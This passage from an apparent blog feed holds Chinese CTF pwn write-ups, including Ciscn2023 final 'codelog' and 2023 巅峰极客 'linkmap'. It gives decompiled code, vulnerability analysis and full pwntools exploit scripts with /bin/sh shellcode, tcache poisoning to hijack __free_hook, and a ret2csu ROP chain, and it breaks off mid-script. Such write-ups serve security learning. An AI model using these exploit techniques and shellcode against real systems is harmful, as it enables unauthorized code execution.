&gt; <span class="number">47</span> )</span><br><span class="line">      v6 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; *(buf + i) != <span class="string">&#x27;\n&#x27;</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(buf + i) &lt;= <span class="number">0x20</span> || *(buf + i) &gt; <span class="number">0x30</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(buf + i) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i) &lt;= <span class="number">0x39</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( dword_4010 &gt; <span class="number">47</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++dword_4010;</span><br><span class="line">          v5 = qword_40E0;</span><br><span class="line">          *v5 = atof(buf + i);</span><br><span class="line">          qword_40E0 += <span class="number">8LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="number">0x2E</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="number">0x39</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// (0x20,0x30]</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_4010 &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v9 = s;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="built_in">fabs</span>(*v9);</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0.0</span> &amp;&amp; (v12 &lt; <span class="number">1.0</span> || v12 &gt; <span class="number">100.0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v12);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v9;</span><br><span class="line">        &#125;</span><br><span class="line">        (qword_4060[*(buf + i) - <span class="number">0x20</span>])();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( s &lt; qword_40E0 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Result: %lf\n&quot;</span>, *(qword_40E0 - <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先需要逆向出来和菜单交互的格式 我们需要使得dword_4010大于1 同时还要绕过这两个循环</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="number">0x2E</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="number">0x39</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="built_in">fabs</span>(*v9);</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0.0</span> &amp;&amp; (v12 &lt; <span class="number">1.0</span> || v12 &gt; <span class="number">100.0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v12);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v9;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>第一个循环 相对来说容易 只需要在对应字符后面加上超出范围的字符即可</p><p>第二个循环限制比较大 对0x48个字长的空间都进行了check</p><p>随后呢根据输入的字符 取决调用哪个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 (__fastcall *sub_1384())()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (__fastcall *result)(); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  qword_4060[<span class="number">0</span>] = printf_nop;</span><br><span class="line">  qword_4068 = printf_nop;</span><br><span class="line">  qword_4070 = printf_nop;</span><br><span class="line">  qword_4078 = printf_nop;</span><br><span class="line">  qword_4080 = printf_nop;</span><br><span class="line">  qword_4088 = printf_nop;</span><br><span class="line">  qword_4090 = printf_nop;</span><br><span class="line">  qword_4098 = printf_nop;</span><br><span class="line">  qword_40A0 = printf_nop;</span><br><span class="line">  qword_40A8 = printf_nop;</span><br><span class="line">  qword_40B0 = sub_12BB;</span><br><span class="line">  qword_40B8 = sub_1208 + <span class="number">1</span>;</span><br><span class="line">  qword_40C0 = printf_nop;</span><br><span class="line">  qword_40C8 = sub_1262;</span><br><span class="line">  qword_40D0 = printf_nop;</span><br><span class="line">  result = sub_1314;</span><br><span class="line">  qword_40D8 = sub_1314;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺便在main函数的开头 还隐藏着一个buf地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">qword_40E0 = s;</span><br></pre></td></tr></table></figure><p>我们通过字符’0’就可以实现call buf 这里就存在了shellcode的调用</p><p>由于我们刚才说到的check的存在 我们没办法把shellcode放到payload后面 所以需要通过把shellcode写到不会被check的前面 然后控制rsp寄存器再跳转过去</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;47.92.7.93&quot;,8802)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your expression:&quot;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add rsp,0x10</span></span><br><span class="line"><span class="string">jmp rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;\x35\x40\x35\x40\x30\x30\x30\x30&#x27;</span>+<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span>+cyclic(<span class="number">0x21</span>)+p64(<span class="number">0x4014000000000000</span>)*<span class="number">2</span>+asm(shellcode)+<span class="string">b&#x27;\x40\x40&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x187a)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ciscn2023决赛</title>
      <link href="/2023/07/26/Ciscn2023%E5%86%B3%E8%B5%9B/"/>
      <url>/2023/07/26/Ciscn2023%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="codelog"><a href="#codelog" class="headerlink" title="codelog"></a>codelog</h2><p>一道看起来是序列化的简单堆题。。。 被赛方开赛前说的有两题序列化protobuf跟flatbuffers坑了</p><p>导致先去看了第三题的正常堆 结果一个数独逆不出来。。。 结果爆零噜</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        init_code(v16, v3, v4, v5, v6, v7, v18, v19, v20, v21);</span><br><span class="line">        v18 = v16[<span class="number">0</span>];</span><br><span class="line">        v19 = v16[<span class="number">1</span>];</span><br><span class="line">        v20 = v16[<span class="number">2</span>];</span><br><span class="line">        v21 = v16[<span class="number">3</span>];</span><br><span class="line">        check_number = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check_number != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        open_flag();</span><br><span class="line">        encode(s1, v3, v8, v9, v10, v11, v18, v19, v20, v21);</span><br><span class="line">        close_flag();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check_number != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        open_flag();</span><br><span class="line">        decode(s1, v3, v12, v13, v14, v15, v18, v19, v20);</span><br><span class="line">        close_flag();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show_code(s1, v3, v4, v5, v6, v7, v18, v19, v20, v21);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show_tree(v19, <span class="number">2</span> * v20 - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑就是菜单 不过有几个函数起到了一个误导作用</p><p>关键的漏洞有两个 一个是init_code函数中存在了一个scanf引起的堆溢出 还有一个是没有开启PIE保护机制</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272227538.png" title="image-20230727222709447" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272227538.png" alt="image-20230727222709447"></a></p><p>实际其他函数都是一个误导作用  我们只需要利用init_code函数的堆溢出 覆盖tcachebin的fd域 使得申请到bss段上 从而向存放chunk指针的数组写入got表的地址 这样就可以借助show函数把libc地址泄露出来了 随后利用同样的手法打free_hook</p><p>唯一要注意的就是init_code本身会对堆构造产生影响 所以需要自己动调注意一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;47.92.7.93&quot;,8802)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Init</span>(<span class="params">size,char,weight</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;char: &quot;</span>)</span><br><span class="line">        io.sendline(char)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;weight: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(weight))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,log</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Add_log&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log: &quot;</span>)</span><br><span class="line">    io.sendline(log)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Delete_log&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Print_log&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Init_much</span>(<span class="params">size,char,weight,char2,weight2</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;char: &quot;</span>)</span><br><span class="line">    io.sendline(char)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;weight: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(weight))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;char: &quot;</span>)</span><br><span class="line">    io.sendline(char2)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;weight: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(weight2))</span><br><span class="line">Init(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>-<span class="number">0x2</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0x405230</span>)</span><br><span class="line">Init_much(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,payload,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,p64(puts_got))<span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = cyclic(<span class="number">0xe</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(free_hook)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401AE1&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">Init_much(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,payload,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023巅峰极客</title>
      <link href="/2023/07/21/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
      <url>/2023/07/21/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这次比赛难度比较大 只做出了一题 不过哪怕是这一题都有很大的收获 记录一下</p><h2 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307211539513.png" title="image-20230721153857449" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307211539513.png" alt="image-20230721153857449"></a></p><p>开启了FULL RELRO 导致got表不可写 这将成为我们后续利用的一大阻碍</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_40071B(a1, a2, a3);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的主体逻辑非常简单 单单提供了一次栈溢出的机会</p><p>不过还给了几个看起来很奇怪的函数 我们发现他们的功能都是可以往bss段写入数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400606</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(qword_601040 + a1);</span><br><span class="line">  qword_601040 = v4;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)a1;</span><br><span class="line">  dword_601048 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601028[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601020[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点观察一下上面的函数 前两行我们可以把任意地址的内容写到任意地址上</p><p>像这种没有提供输出函数的栈溢出题目 一般都是通过覆盖got表 要么是覆盖setvbuf来获得puts函数</p><p>要么是覆盖read函数来获得syscall 但是由于这题开启了got表 一开始我是想打消念头的</p><p>但是不知道你还记不记得 在栈的学习初期 我们学过ret2csu 其调用函数时通过call指令来调用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004007C0                 mov     rdx, r13</span><br><span class="line">.text:00000000004007C3                 mov     rsi, r14</span><br><span class="line">.text:00000000004007C6                 mov     edi, r15d</span><br><span class="line">.text:00000000004007C9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004007CD                 add     rbx, 1</span><br><span class="line">.text:00000000004007D1                 cmp     rbx, rbp</span><br><span class="line">.text:00000000004007D4                 jnz     short loc_4007C0</span><br><span class="line">.text:00000000004007D6</span><br><span class="line">.text:00000000004007D6 loc_4007D6:                             ; CODE XREF: init+34↑j</span><br><span class="line">.text:00000000004007D6                 add     rsp, 8</span><br><span class="line">.text:00000000004007DA                 pop     rbx</span><br><span class="line">.text:00000000004007DB                 pop     rbp</span><br><span class="line">.text:00000000004007DC                 pop     r12</span><br><span class="line">.text:00000000004007DE                 pop     r13</span><br><span class="line">.text:00000000004007E0                 pop     r14</span><br><span class="line">.text:00000000004007E2                 pop     r15</span><br><span class="line">.text:00000000004007E4                 retn</span><br></pre></td></tr></table></figure><p>这题之所以困扰我们 是因为开启了FULL RELRO导致的got表不可覆盖 那么如果我们利用漏洞函数把read函数的真实地址写到bss段 而bss段是可以写的 我们可以将其覆盖最后一位为syscall 随后利用ret2csu来调用  就可以达到目的</p><p>随后我们利用read函数输入0x3b个字节 就可以达到控制rax寄存器 随后设置rdi寄存器和rsi寄存器 最后调用syscall 就可以实现execve(“&#x2F;bin&#x2F;sh”,0)</p><p>难点主要在于无法同时进行read控制rax和ret2csu 这样会导致输入的长度过多 我们需要把ret2csu部分的payload单独放到其他内存 然后在控制完rax寄存器后跳转过去</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn-b5c90fa468.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x00000000004007e3</span></span><br><span class="line">setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">ptr_read = <span class="number">0x400752</span></span><br><span class="line">csu_addr = <span class="number">0x4007DA</span></span><br><span class="line">csu2_addr = <span class="number">0x4007C0</span></span><br><span class="line">main_addr = <span class="number">0x400740</span></span><br><span class="line">read_addr = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">magic_addr = <span class="number">0x601030</span></span><br><span class="line">rbp_addr = <span class="number">0x0000000000400570</span></span><br><span class="line">rsp_addr = <span class="number">0x00000000004007dd</span></span><br><span class="line">a_addr = <span class="number">0x40067c</span></span><br><span class="line">rsi_r15 = <span class="number">0x00000000004007e1</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(elf.bss(<span class="number">0x500</span>)+<span class="number">0x10</span>)+p64(ptr_read)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x8</span>)+p64(ptr_read)+p64(elf.bss(<span class="number">0x500</span>))+p64(rdi_addr)+p64(read_got)+p64(<span class="number">0x400606</span>)+p64(ptr_read)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+cyclic(<span class="number">0x8</span>)+p64(elf.bss(<span class="number">0xa00</span>))+p64(ptr_read)+cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(elf.bss(<span class="number">0x800</span>))+p64(ptr_read)+p64(csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x601530</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x601500</span>)+p64(csu2_addr)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(elf.bss(<span class="number">0x800</span>))+p64(read_addr)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(csu_addr)+cyclic(<span class="number">0x18</span>)+p64(rsp_addr)+p64(elf.bss(<span class="number">0xa00</span>)-<span class="number">0x8</span>)+p64(<span 